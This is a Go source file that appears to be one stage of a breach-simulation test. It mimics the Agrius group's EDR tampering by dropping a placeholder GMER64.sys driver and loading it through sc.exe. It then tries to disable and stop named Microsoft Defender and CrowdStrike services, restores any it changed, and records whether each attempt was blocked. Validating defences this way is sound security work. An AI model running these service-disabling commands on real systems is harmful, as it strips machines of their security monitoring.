//go:build windows
// +build windows

// Stage 3: EDR Tampering via Driver Load and Service Modification (T1562.001)
// Simulates Agrius GMER64.sys kernel driver loading and EDR service tampering
// Attempts to write driver file, load driver, and modify EDR service startup

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "7d39b861-644d-4f8b-bb19-4faae527a130"
	TECHNIQUE_ID   = "T1562.001"
	TECHNIQUE_NAME = "Impair Defenses: Disable or Modify Tools"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// Simulated driver file content (benign - not a real driver)
var fakeDriverContent = []byte("F0RT1KA SIMULATION - GMER64.SYS DRIVER PLACEHOLDER\r\nThis is NOT a real kernel driver.\r\nAgrius uses GMER64.sys to disable EDR at kernel level.\r\n")

// EDR service names commonly targeted by Agrius
var edrServiceTargets = []string{
	"Sense",                    // Microsoft Defender for Endpoint
	"WinDefend",                // Windows Defender Antivirus Service
	"MsSense",                  // Microsoft Defender for Endpoint (older)
	"CrowdStrike Falcon Sensor", // CrowdStrike
	"CSFalconService",          // CrowdStrike
}

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	fmt.Printf("[STAGE %s] Starting %s\n", TECHNIQUE_ID, TECHNIQUE_NAME)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogMessage("INFO", TECHNIQUE_ID, "Simulating EDR tampering via GMER64.sys driver and service modification")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
		LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		os.Exit(determineExitCode(err))
	}

	fmt.Printf("[STAGE %s] %s executed successfully\n", TECHNIQUE_ID, TECHNIQUE_NAME)
	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("%s executed successfully", TECHNIQUE_NAME))
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "EDR tampering simulation completed")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "c:\\F0"
	tamperAttempts := 0
	tamperBlocked := 0

	// Phase 1: Simulate GMER64.sys driver deployment
	driverPath := filepath.Join(targetDir, "GMER64.sys")
	fmt.Printf("[STAGE %s] Phase 1: Deploying simulated GMER64.sys driver\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Deploying simulated GMER64.sys driver file")

	if err := os.WriteFile(driverPath, fakeDriverContent, 0755); err != nil {
		return fmt.Errorf("driver deployment blocked: %v", err)
	}

	time.Sleep(1 * time.Second)
	if _, err := os.Stat(driverPath); os.IsNotExist(err) {
		return fmt.Errorf("GMER64.sys quarantined by EDR before driver load")
	}

	LogFileDropped("GMER64.sys", driverPath, int64(len(fakeDriverContent)), false)
	fmt.Printf("[STAGE %s] GMER64.sys deployed to %s\n", TECHNIQUE_ID, driverPath)

	// Phase 2: Attempt to load driver using sc.exe (will fail without a real .sys)
	fmt.Printf("[STAGE %s] Phase 2: Attempting kernel driver load via sc.exe\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Attempting to load GMER64.sys via sc.exe create/start")

	tamperAttempts++
	createCmd := exec.Command("sc.exe", "create", "F0RT1KA_GMER64",
		"binPath=", driverPath,
		"type=", "kernel",
		"start=", "demand")
	createOutput, createErr := createCmd.CombinedOutput()
	createOutputStr := strings.TrimSpace(string(createOutput))
	fmt.Printf("[STAGE %s] Driver service create: %s\n", TECHNIQUE_ID, createOutputStr)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Driver service create result: %s", createOutputStr))

	if createErr != nil {
		tamperBlocked++
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Driver service creation blocked: %v", createErr))
	} else {
		// Try to start the driver service
		startCmd := exec.Command("sc.exe", "start", "F0RT1KA_GMER64")
		startOutput, startErr := startCmd.CombinedOutput()
		startOutputStr := strings.TrimSpace(string(startOutput))
		fmt.Printf("[STAGE %s] Driver service start: %s\n", TECHNIQUE_ID, startOutputStr)
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Driver service start result: %s", startOutputStr))

		if startErr != nil {
			LogMessage("INFO", TECHNIQUE_ID, "Driver service failed to start (expected - not a real driver)")
		}

		// Cleanup driver service
		exec.Command("sc.exe", "stop", "F0RT1KA_GMER64").CombinedOutput()
		exec.Command("sc.exe", "delete", "F0RT1KA_GMER64").CombinedOutput()
		LogMessage("INFO", TECHNIQUE_ID, "Driver service cleaned up")
	}

	// Phase 3: Attempt to modify EDR service startup type
	fmt.Printf("[STAGE %s] Phase 3: Attempting EDR service tampering\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Attempting to disable EDR services via sc.exe config")

	for _, svcName := range edrServiceTargets {
		tamperAttempts++

		// First check if service exists
		queryCmd := exec.Command("sc.exe", "query", svcName)
		queryOutput, queryErr := queryCmd.CombinedOutput()

		if queryErr != nil {
			fmt.Printf("[STAGE %s] Service %s: not found (skipping)\n", TECHNIQUE_ID, svcName)
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Service %s not found, skipping", svcName))
			tamperAttempts-- // Don't count non-existent services
			continue
		}

		// Service exists - attempt to disable it
		fmt.Printf("[STAGE %s] Found service %s - attempting to disable\n", TECHNIQUE_ID, svcName)
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Attempting to disable service: %s", svcName))

		// Attempt to change startup type to disabled
		configCmd := exec.Command("sc.exe", "config", svcName, "start=", "disabled")
		configOutput, configErr := configCmd.CombinedOutput()
		configOutputStr := strings.TrimSpace(string(configOutput))

		if configErr != nil || strings.Contains(strings.ToLower(configOutputStr), "access") {
			tamperBlocked++
			fmt.Printf("[STAGE %s] Service %s tampering blocked: %s\n", TECHNIQUE_ID, svcName, configOutputStr)
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Service %s tampering blocked: %s", svcName, configOutputStr))
		} else {
			fmt.Printf("[STAGE %s] WARNING: Service %s disabled successfully\n", TECHNIQUE_ID, svcName)
			LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("EDR service %s disabled without prevention!", svcName))

			// SAFETY: Immediately re-enable the service
			reEnableCmd := exec.Command("sc.exe", "config", svcName, "start=", "auto")
			reEnableOutput, _ := reEnableCmd.CombinedOutput()
			fmt.Printf("[STAGE %s] SAFETY: Re-enabled service %s: %s\n", TECHNIQUE_ID, svcName, strings.TrimSpace(string(reEnableOutput)))
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("SAFETY: Re-enabled service %s", svcName))
		}

		// Attempt to stop the service
		tamperAttempts++
		fmt.Printf("[STAGE %s] Attempting to stop service: %s\n", TECHNIQUE_ID, svcName)
		stopCmd := exec.Command("sc.exe", "stop", svcName)
		stopOutput, stopErr := stopCmd.CombinedOutput()
		stopOutputStr := strings.TrimSpace(string(stopOutput))

		if stopErr != nil || strings.Contains(strings.ToLower(stopOutputStr), "access") ||
			strings.Contains(strings.ToLower(stopOutputStr), "denied") {
			tamperBlocked++
			fmt.Printf("[STAGE %s] Service stop blocked: %s\n", TECHNIQUE_ID, stopOutputStr)
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Service %s stop blocked: %s", svcName, stopOutputStr))
		} else if strings.Contains(strings.ToLower(string(queryOutput)), "running") {
			fmt.Printf("[STAGE %s] WARNING: Service %s stopped\n", TECHNIQUE_ID, svcName)
			LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("EDR service %s stopped without prevention!", svcName))

			// SAFETY: Restart the service
			restartCmd := exec.Command("sc.exe", "start", svcName)
			restartOutput, _ := restartCmd.CombinedOutput()
			fmt.Printf("[STAGE %s] SAFETY: Restarted service %s: %s\n", TECHNIQUE_ID, svcName, strings.TrimSpace(string(restartOutput)))
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("SAFETY: Restarted service %s", svcName))
		}
	}

	// Cleanup driver file
	os.Remove(driverPath)
	LogMessage("INFO", TECHNIQUE_ID, "Cleaned up GMER64.sys simulation file")

	// Evaluate results
	fmt.Printf("[STAGE %s] EDR tampering summary: %d attempts, %d blocked\n", TECHNIQUE_ID, tamperAttempts, tamperBlocked)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Tampering summary: %d attempts, %d blocked", tamperAttempts, tamperBlocked))

	// If all meaningful attempts were blocked, EDR is protecting
	if tamperAttempts > 0 && tamperBlocked == tamperAttempts {
		return fmt.Errorf("all EDR tampering attempts blocked (%d/%d)", tamperBlocked, tamperAttempts)
	}

	return nil
}

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := strings.ToLower(err.Error())
	if strings.Contains(errStr, "blocked") || strings.Contains(errStr, "denied") ||
		strings.Contains(errStr, "prevented") || strings.Contains(errStr, "quarantined") {
		return StageBlocked
	}
	if strings.Contains(errStr, "privilege") || strings.Contains(errStr, "not found") {
		return StageError
	}
	return StageBlocked
}
